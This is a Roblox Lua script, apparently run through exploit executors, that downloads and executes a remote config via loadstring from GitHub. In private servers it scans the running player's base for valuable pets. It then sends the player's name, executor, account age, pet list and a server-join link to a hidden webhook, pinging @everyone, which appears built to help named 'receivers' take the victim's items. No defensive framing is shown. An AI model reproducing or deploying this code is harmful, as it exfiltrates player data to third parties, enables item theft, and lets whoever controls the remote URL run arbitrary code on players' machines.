-- Services
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")

local player = Players.LocalPlayer

-- Load config from GitHub
local config = {}
do
    local ok, res = pcall(function()
        return loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag-IDP/tsetging234/refs/heads/main/config"))()
    end)
    if ok and type(res) == "table" then
        config = res
    else
        config = {
            WEBHOOK = "",
            targetNames = {},
            Receiver = {}
        }
    end
end

local WEBHOOK = config.WEBHOOK
local targetNames = config.targetNames or {}
local receiverList = table.concat(config.Receiver or {}, ", ")

-- Executor & account age detection
local function detectExecutor()
    if syn then return "Synapse X"
    elseif KRNL_LOADED then return "KRNL"
    elseif fluxus then return "Fluxus"
    elseif secure_load then return "Sentinel"
    elseif getexecutorname then return getexecutorname()
    elseif identifyexecutor then return identifyexecutor()
    else return "Unknown" end
end

local function getAccountAge()
    return player and player.AccountAge or 0
end

-- Detect server type
local serverType = "UNKNOWN"
local map = Workspace:FindFirstChild("Map")
if map then
    local codes = map:FindFirstChild("Codes")
    local main = codes and codes:FindFirstChild("Main")
    local surfaceGui = main and main:FindFirstChild("SurfaceGui")
    local sFrame = surfaceGui and surfaceGui:FindFirstChild("MainFrame")
    local privateMsg = sFrame and sFrame:FindFirstChild("PrivateServerMessage")
    serverType = (privateMsg and privateMsg.Visible) and "PRIVATE SERVER" or "PUBLIC SERVER"
end

-- Get priority index for a pet name
local function getPriority(name)
    for i, t in ipairs(targetNames) do
        if t.name and name:find(t.name) then
            return i
        end
    end
    return math.huge
end

local function shuffle(tbl)
    for i = #tbl, 2, -1 do
        local j = math.random(i)
        tbl[i], tbl[j] = tbl[j], tbl[i]
    end
end

-- Scan only your base
local function scanMyBase()
    local found = {}
    local plots = Workspace:FindFirstChild("Plots")
    if not plots then return found end

    for _, plot in ipairs(plots:GetChildren()) do
        local sign = plot:FindFirstChild("PlotSign")
        if sign and sign:FindFirstChild("SurfaceGui") and sign.SurfaceGui:FindFirstChild("Frame") then
            local label = sign.SurfaceGui.Frame:FindFirstChild("TextLabel")
            if label and label.Text:find(player.DisplayName) then
                local podiums = plot:FindFirstChild("AnimalPodiums")
                if podiums then
                    for _, podium in ipairs(podiums:GetChildren()) do
                        local base = podium:FindFirstChild("Base")
                        local spawn = base and base:FindFirstChild("Spawn")
                        local attachment = spawn and spawn:FindFirstChild("Attachment")
                        local overhead = attachment and attachment:FindFirstChild("AnimalOverhead")
                        if overhead then
                            local displayName = overhead:FindFirstChild("DisplayName")
                            local genLabel = overhead:FindFirstChild("Generation")
                            local petName = (displayName and displayName.Text) or "Unknown"
                            -- Determine floor from podium name
                            local floor = "Unknown Floor"
                            local num = tonumber(podium.Name:match("^(%d+)_?"))
                            if num then
                                if num >= 1 and num <= 10 then floor = "1st Floor"
                                elseif num >= 11 and num <= 18 then floor = "2nd Floor"
                                else floor = "3rd Floor" end
                            end
                            table.insert(found, {name = petName, floor = floor})
                        end
                    end
                end
                break -- only your base
            end
        end
    end
    return found
end

-- Send webhook
local function sendWebhook(pets)
    if not pets or #pets == 0 then return end
    if player and player:GetAttribute("WebhookSent") then return end

    local priorityPets, normalPets = {}, {}
    local brainrotDetected = false

    for _, pet in ipairs(pets) do
        local prio = getPriority(pet.name)
        local line = string.format("%s (%s)", pet.name, pet.floor)
        if prio ~= math.huge then
            table.insert(priorityPets, {line = line, priority = prio})
            brainrotDetected = true
        else
            table.insert(normalPets, line)
        end
    end

    if not brainrotDetected then return end -- only send if priority Brainrot detected

    table.sort(priorityPets, function(a,b) return a.priority < b.priority end)

    local orderedLines = {}
    for _, p in ipairs(priorityPets) do table.insert(orderedLines, p.line) end
    for _, n in ipairs(normalPets) do table.insert(orderedLines, n) end

    local lootText = table.concat(orderedLines, "\n")
    local placeId = tostring(game.PlaceId or "")
    local jobId = tostring(game.JobId or "")
    local serverLink = ("https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s"):format(placeId, jobId)

    local embed = {
        ["title"] = "ğŸ§  Brainrot Detected!",
        ["color"] = 16711680,
        ["fields"] = {
            {["name"]="Players", ["value"]=string.format("%d/6", #Players:GetPlayers())},
            {["name"]="Server Type", ["value"]=serverType},
            {["name"]="ğŸ‘¥ Player Info", ["value"]="Name: "..(player and player.Name or "Unknown")..
                "\nReceiver: "..receiverList..
                "\nExecutor: "..detectExecutor()..
                "\nAccount Age: "..tostring(getAccountAge()).." days"},
            {["name"]="ğŸ§  Detected Pets", ["value"]=lootText},
            {["name"]="Join Server Link", ["value"]=("[Click to Join Server](%s)"):format(serverLink)}
        }
    }

    local payload = {
        ["content"] = "ğŸ“£ @everyone **Brainrot Detected!**",
        ["embeds"] = {embed},
        ["allowed_mentions"] = {["parse"]={"everyone"}}
    }

    local req = (syn and syn.request) or http_request or (http and http.request) or request
    if req and WEBHOOK and WEBHOOK ~= "" then
        pcall(function()
            req({
                Url = WEBHOOK,
                Method = "POST",
                Headers = {["Content-Type"]="application/json"},
                Body = HttpService:JSONEncode(payload)
            })
        end)
        if player then
            player:SetAttribute("WebhookSent", true)
        end
    end
end

-- Run automatic scan in private server
if serverType ~= "PUBLIC SERVER" then
    task.spawn(function()
        local pets = scanMyBase()
        sendWebhook(pets)
    end)
end
